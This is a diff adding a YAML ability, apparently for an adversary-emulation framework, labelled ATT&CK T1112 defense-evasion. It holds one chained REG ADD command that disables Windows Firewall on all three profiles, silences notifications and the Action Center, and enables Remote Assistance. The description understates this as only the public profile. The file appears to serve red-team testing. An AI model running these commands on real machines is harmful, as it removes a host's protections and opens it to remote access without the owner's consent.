@@ -1,0 +1,39 @@
+- additional_info:
+    cleanup: '[]'
+  singleton: false
+  plugin: ''
+  access: {}
+  technique_name: Modify Registry
+  description: 'Add registry keys to : 1. Disable notifications / 2. Allow RDP Assistance
+    / 3. Disable Firewall on PublicProfile / 4. Activation of ANSI colors support
+    in terminal'
+  technique_id: T1112
+  tactic: defense-evasion
+  repeatable: false
+  requirements: []
+  buckets: []
+  executors:
+  - cleanup: []
+    command: REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\PushNotifications
+      /v ToastEnabled /t REG_DWORD /d 0 /f && REG ADD HKEY_CURRENT_USER\Console /v
+      VirtualTerminalLevel /t REG_DWORD /d 1 /f && REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile
+      /v EnableFirewall /t REG_DWORD /d 0 /f && REG ADD HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile
+      /v EnableFirewall /t REG_DWORD /d 0 /f && REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile
+      /v EnableFirewall /t REG_DWORD /d 0 /f && REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell
+      /v UseActionCenterExperience /t REG_DWORD /d 0 /f && REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+      Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+    code: null
+    timeout: 60
+    additional_info: {}
+    build_target: null
+    language: null
+    uploads: []
+    parsers: []
+    variations: []
+    payloads: []
+    platform: windows
+    name: cmd
+  privilege: ''
+  delete_payload: false
+  name: Add several Registry Keys (2)
+  id: add_reg_keys
